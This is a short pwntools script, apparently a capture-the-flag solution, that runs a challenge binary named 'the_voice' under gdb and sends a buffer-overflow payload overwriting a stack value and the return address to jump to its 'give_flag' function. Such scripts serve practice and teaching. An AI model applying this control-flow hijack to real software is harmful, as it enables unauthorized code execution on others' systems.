from pwn import *


context.binary = b = ELF("./the_voice")

io = gdb.debug("./the_voice")

io.sendline(b'15\x00' + b'A'*21 + p64(10191) + b'B'*8 + p64(b.symbols['give_flag']))

io.interactive()
